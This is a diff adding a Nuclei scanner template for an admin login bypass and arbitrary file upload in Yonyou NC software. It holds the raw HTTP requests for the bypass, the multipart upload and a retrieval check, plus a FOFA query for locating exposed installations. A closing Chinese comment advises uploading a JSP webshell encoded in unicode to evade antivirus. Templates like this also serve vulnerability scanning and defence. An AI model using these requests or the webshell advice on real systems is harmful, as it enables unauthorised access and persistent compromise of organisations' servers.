@@ -1,0 +1,55 @@
+id: yonyou-nc-uploadfile-fileupload
+
+info:
+  name: 用友nc /mp/uploadControl/uploadFile接口存在后台文件上传
+  author: monster
+  severity: critical
+  reference:
+    - none
+  tags: yonyou,nc,fileupload
+  metadata:
+    veified: true
+    fofa-query: app="用友-UFIDA-NC"
+    max-request: 3
+
+http:
+  - raw:
+      - |
+        GET /mp/loginxietong?username=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/115.0.0.0 Safari/537.36
+
+      - |
+        POST /mp/uploadControl/uploadFile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/115.0.0.0 Safari/537.36
+        Content-Length: 316
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Upgrade-Insecure-Requests: 1
+
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.txt"
+        Content-Type: application/octet-stream
+
+        {{randstr}}
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+        Content-Disposition: form-data; name="submit" 
+
+        submit
+        ------WebKitFormBoundaryoDIsCqVMmF83ptmp--
+
+      - |
+        GET /mp/uploadFileDir/{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/115.0.0.0 Safari/537.36
+
+
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200"
+          - "status_code_3 == 200 && contains(body_3, '{{randstr}}')"
+        condition: and
+
+# 该站需传jsp的马子，马子需要经过unicode编码等方式绕过，否则会被杀
